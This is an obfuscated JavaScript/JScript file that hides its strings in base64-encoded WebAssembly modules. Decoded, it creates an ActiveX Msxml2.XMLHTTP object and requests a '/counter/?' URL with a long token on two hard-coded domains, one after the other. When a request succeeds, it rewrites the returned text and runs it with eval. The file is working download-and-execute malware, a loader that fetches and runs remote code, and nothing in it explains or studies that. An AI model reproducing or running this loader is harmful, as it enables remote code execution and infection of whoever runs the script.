const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGv4CAgAALfwBBAQt/AEEEC38AQRQLfwBBLAt/AEHEAAt/AEHIAAt/AEGWAQt/AEGmAQt/AEG4AQt/AEG8AQt/AEHMAQsH44CAgAAMBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoLgIKAgAALAEEBCwJUAABBBAsPTXN4bWwyLlhNTEhUVFAAAEEUCxduYXR1cmVwcmludHNmbG9vcnMuY29tAABBLAsWbm9yY2FscG93ZXJzcG9ydHMuY29tAABBxAALA0dFAABByAALTExaWjhEUk9zZUtadjVzN2lNclA2R0xuWkFBX3J4Rk42ZmZBSmFQVDNlVlVfNWhyX1FlNnppTWx1b29KajdlU3JpdVF4QTNFcVFRMAAAQZYBCw5odHRwJTNBJTJGJTJGAABBpgELESUyRmNvdW50ZXIlMkYlM0YAAEG4AQsCYQAAQbwBCw5BY3RpdmVYT2JqZWN0AABBzAELBWV2YWwA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var z8 = lS(0, 0);
var z1 = lS(0, 1);
var x = new Array(lS(0, 2), lS(0, 3));
for (var i = 0; i < x.length; i++) {
    var z7 = lS(0, 4) + z8;
    var m = lS(0, 5);
    var e = new window[(lS(0, 9, true))](z1);
    x[i] = lS(0, 6) + x[i] + lS(0, 7);
    try {
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.open(z7, x[i] + m, false);
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        var z4 = lS(0, 8);
        (() => {
            const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.send();
                    }
                }
            });
            const __exports = __callInstance0.exports;
            return __exports.data();
        })();
        var z5 = e.status;
        if (z5 == 200) {
            var z3 = e.responseText;
            var z3 = z3.split(m).join(z4);
            window[lS(0, 10, true)](z3);
            break;
        }
        ;
    } catch (e) {
    }
    ;
}
;